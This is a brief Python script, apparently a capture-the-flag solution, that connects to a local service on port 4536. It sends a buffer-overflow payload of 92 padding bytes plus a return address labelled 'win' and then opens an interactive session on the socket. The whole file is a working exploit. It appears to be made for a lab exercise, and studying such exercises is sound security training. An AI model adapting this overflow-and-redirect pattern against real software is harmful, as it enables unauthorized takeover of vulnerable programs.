#!/usr/bin/env python3
import socket, struct, telnetlib
sock = socket.socket()
sock.connect(('localhost', 4536))

print(sock.recv(4096))

payload = b'a'*92 + struct.pack('<Q', 0x080487d8) + b'\n'

print(payload)
sock.send(payload)

print(sock.recv(4096))

t = telnetlib.Telnet()
t.sock = sock
t.interact()

#0x080487d8 win
#0x080487ac lose
